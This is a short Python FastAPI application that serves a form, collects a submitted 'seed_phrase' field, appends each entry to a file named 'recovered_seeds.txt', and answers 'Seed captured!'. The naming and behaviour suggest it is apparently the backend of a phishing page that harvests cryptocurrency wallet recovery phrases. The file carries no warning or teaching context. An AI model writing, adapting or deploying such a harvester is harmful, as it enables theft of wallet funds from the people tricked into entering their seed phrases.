from fastapi import FastAPI, Form, Request
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
import os

app = FastAPI()
templates = Jinja2Templates(directory="templates")

@app.get("/", response_class=HTMLResponse)
async def form_get(request: Request):
    return templates.TemplateResponse("form.html", {"request": request})

@app.post("/", response_class=HTMLResponse)
async def handle_form(request: Request, seed_phrase: str = Form(...)):
    with open("recovered_seeds.txt", "a") as f:
        f.write(seed_phrase + "\n")
    return templates.TemplateResponse("form.html", {"request": request, "message": "Seed captured!"})